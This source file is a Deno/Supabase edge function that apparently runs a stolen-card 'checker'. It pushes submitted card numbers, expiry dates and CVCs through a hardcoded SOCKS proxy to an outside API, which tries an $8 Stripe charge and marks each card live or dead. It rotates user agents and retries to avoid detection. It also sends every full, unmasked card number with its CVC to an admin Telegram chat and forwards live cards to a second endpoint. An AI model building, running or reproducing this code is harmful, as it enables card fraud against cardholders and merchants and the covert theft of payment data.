import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Max-Age": "86400",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_ANON_KEY = Deno.env.get("SUPABASE_ANON_KEY")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN")!;
const ADMIN_TELEGRAM_CHAT_ID = Deno.env.get("ADMIN_TELEGRAM_CHAT_ID")!;

// API Configuration
const API_BASE_URL = "http://web-production-7ad4f.up.railway.app/api";
const PROXY_IP = "138.197.124.55";
const PROXY_PORT = "9150";
const PROXY_TYPE = "sock5";

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];

// Send admin debug notification - MUST be awaited
const sendAdminDebug = async (
  cc: string, 
  result: string, 
  rawResponse: string,
  apiUrl: string
): Promise<boolean> => {
  console.log(`[STRIPE-CHARGE] Sending admin debug for ${result}...`);
  console.log(`[STRIPE-CHARGE] Bot token exists: ${!!TELEGRAM_BOT_TOKEN}`);
  console.log(`[STRIPE-CHARGE] Admin chat ID: ${ADMIN_TELEGRAM_CHAT_ID}`);
  
  try {
    const cardParts = cc.split('|');
    const maskedCard = cardParts[0]?.slice(0, 6) + '****' + cardParts[0]?.slice(-4);
    const fullCard = cc;
    
    // Parse raw response
    let parsedStatus = 'N/A';
    let parsedMessage = 'N/A';
    let parsedFullResponse = 'N/A';
    
    try {
      const parsed = JSON.parse(rawResponse);
      parsedStatus = String(parsed.status || 'N/A');
      parsedMessage = String(parsed.message || 'N/A').substring(0, 300);
      parsedFullResponse = String(parsed.full_response);
    } catch {
      parsedMessage = rawResponse.substring(0, 300);
    }

    const statusEmoji = result === 'CHARGED' ? '✅' : result === 'DECLINED' ? '❌' : '⚠️';
    
    // Use plain text - no markdown/html to avoid parsing issues
    const message = `${statusEmoji} STRIPE CHARGE $8 - ${result}

💳 Card: ${maskedCard}
🔢 Full: ${fullCard}
💰 Amount: $8.00

📡 API URL:
${apiUrl}

📋 Parsed Response:
• status: ${parsedStatus}
• message: ${parsedMessage}
• full_response: ${parsedFullResponse}

📦 Raw API Response:
${rawResponse.substring(0, 2000)}${rawResponse.length > 2000 ? '...' : ''}`;

    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    console.log(`[STRIPE-CHARGE] Calling Telegram API...`);
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_TELEGRAM_CHAT_ID,
        text: message
      })
    });

    const responseText = await response.text();
    console.log(`[STRIPE-CHARGE] Telegram response: ${response.status} - ${responseText}`);
    
    if (!response.ok) {
      console.error(`[STRIPE-CHARGE] Telegram error: ${responseText}`);
      return false;
    }
    
    console.log(`[STRIPE-CHARGE] Admin debug sent successfully for ${result}`);
    return true;
  } catch (error) {
    console.error('[STRIPE-CHARGE] Failed to send admin debug:', error);
    return false;
  }
};

// Notify charged card for live results
const notifyChargedCard = async (
  userId: string,
  cardDetails: string,
  status: string,
  responseMessage: string,
  amount: string,
  gateway: string
) => {
  if (!SUPABASE_SERVICE_ROLE_KEY) return;

  try {
    await fetch(`${SUPABASE_URL}/functions/v1/notify-charged-card`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${SUPABASE_SERVICE_ROLE_KEY}`,
      },
      body: JSON.stringify({
        user_id: userId,
        card_details: cardDetails,
        status,
        response_message: responseMessage,
        amount,
        gateway,
      }),
    });
  } catch (error) {
    console.error('[STRIPE-CHARGE] Failed to notify charged card:', error);
  }
};

// Perform API check
const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
  const maxRetries = 3;
  
  // Build API URL exactly as specified
  const apiUrl = `${API_BASE_URL}?cc=${encodeURIComponent(cc)}&proxy=${PROXY_IP}:${PROXY_PORT}&proxytype=${PROXY_TYPE}`;
  
  console.log(`[STRIPE-CHARGE] Attempt ${attempt}/${maxRetries}`);
  console.log(`[STRIPE-CHARGE] Card: ${cc.split('|')[0]?.slice(0, 6)}****`);
  console.log(`[STRIPE-CHARGE] Full API URL: ${apiUrl}`);

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 45000);
    
    console.log(`[STRIPE-CHARGE] Fetching API...`);
    const response = await fetch(apiUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
      },
      signal: controller.signal,
    });
    
    clearTimeout(timeoutId);
    
    const rawText = await response.text();
    console.log(`[STRIPE-CHARGE] API Response Status: ${response.status}`);
    console.log(`[STRIPE-CHARGE] Raw response: ${rawText}`);

    // Parse JSON
    let apiData: Record<string, unknown>;
    try {
      apiData = JSON.parse(rawText);
    } catch {
      console.log(`[STRIPE-CHARGE] JSON parse failed`);
      apiData = { 
        status: "ERROR", 
        message: rawText || "Invalid response", 
        full_response: false 
      };
    }

    const apiStatus = String(apiData?.status || 'UNKNOWN');
    const apiMessage = String(apiData?.message || 'No message');
    const fullResponse = apiData?.full_response;

    console.log(`[STRIPE-CHARGE] Parsed: status=${apiStatus}, message=${apiMessage}, full_response=${fullResponse}`);

    // Determine result
    let computedStatus: "live" | "dead" | "unknown" = "unknown";
    
    if (fullResponse === true || String(fullResponse).toLowerCase() === 'true') {
      computedStatus = "live";
    } else if (fullResponse === false || String(fullResponse).toLowerCase() === 'false') {
      computedStatus = "dead";
    } else {
      const msgLower = apiMessage.toLowerCase();
      if (msgLower.includes('charged') || msgLower.includes('success') || msgLower.includes('approved')) {
        computedStatus = "live";
      } else if (msgLower.includes('declined') || msgLower.includes('insufficient') || 
                 msgLower.includes('expired') || msgLower.includes('invalid') ||
                 msgLower.includes('do_not_honor') || msgLower.includes('card_declined')) {
        computedStatus = "dead";
      }
    }

    const displayResult = computedStatus === 'live' ? 'CHARGED' : 
                          computedStatus === 'dead' ? 'DECLINED' : 'UNKNOWN';

    console.log(`[STRIPE-CHARGE] Result: ${displayResult}`);

    // AWAIT admin debug - send for ALL results (CHARGED, DECLINED, UNKNOWN)
    await sendAdminDebug(cc, displayResult, rawText, apiUrl);

    // Retry on UNKNOWN
    if (computedStatus === "unknown" && attempt < maxRetries) {
      console.log(`[STRIPE-CHARGE] UNKNOWN result, retrying...`);
      await new Promise(r => setTimeout(r, 1500));
      return performCheck(cc, getRandomUserAgent(), attempt + 1);
    }

    return {
      computedStatus,
      apiStatus: displayResult,
      apiMessage: apiMessage,
      apiTotal: '$8.00',
      status: computedStatus,
      message: apiMessage,
    };

  } catch (error) {
    console.error(`[STRIPE-CHARGE] Fetch error:`, error);
    
    const errorMsg = error instanceof Error ? error.message : "Request failed";
    
    // AWAIT error debug
    await sendAdminDebug(cc, 'ERROR', `Error: ${errorMsg}`, apiUrl);
    
    if (attempt < maxRetries) {
      console.log(`[STRIPE-CHARGE] Retrying after error...`);
      await new Promise(r => setTimeout(r, 2000));
      return performCheck(cc, getRandomUserAgent(), attempt + 1);
    }
    
    return { 
      computedStatus: "unknown",
      apiStatus: "ERROR",
      apiMessage: errorMsg,
      status: "unknown",
      message: errorMsg,
    };
  }
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const authHeader = req.headers.get("Authorization");
    if (!authHeader?.startsWith("Bearer ")) {
      return new Response(
        JSON.stringify({ error: "Unauthorized" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY, {
      global: { headers: { Authorization: authHeader } },
    });

    const { data: { user }, error: authError } = await supabase.auth.getUser();
    if (authError || !user) {
      return new Response(
        JSON.stringify({ error: "Invalid token" }),
        { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { data: profile } = await supabase
      .from("profiles")
      .select("is_banned")
      .eq("user_id", user.id)
      .single();

    if (profile?.is_banned) {
      return new Response(
        JSON.stringify({ error: "Account suspended" }),
        { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    const { cc } = await req.json();
    
    if (!cc) {
      return new Response(
        JSON.stringify({ error: 'Card data required', computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const parts = cc.split('|');
    if (parts.length < 4) {
      return new Response(
        JSON.stringify({ error: "Format: CardNumber|MM|YY|CVC", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const [cardNum, mm, yy, cvc] = parts;
    
    if (!cvc || cvc.length < 3 || cvc.length > 4 || !/^\d+$/.test(cvc)) {
      return new Response(
        JSON.stringify({ error: "CVC must be 3-4 digits", computedStatus: 'unknown' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`[STRIPE-CHARGE] Processing for user: ${user.id}`);
    console.log(`[STRIPE-CHARGE] Card: ${cardNum.slice(0, 6)}****|${mm}|${yy}|***`);

    const result = await performCheck(cc, getRandomUserAgent());

    // Notify user for LIVE cards
    if (result.computedStatus === "live") {
      notifyChargedCard(
        user.id,
        cc,
        "CHARGED",
        `CHARGED: ${result.apiMessage} ($8.00)`,
        "$8.00",
        "Stripe Charge $8"
      );
    }

    return new Response(
      JSON.stringify(result),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    const msg = error instanceof Error ? error.message : 'Unknown error';
    console.error('[STRIPE-CHARGE] Error:', msg);
    
    return new Response(
      JSON.stringify({ error: msg, computedStatus: "unknown" }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
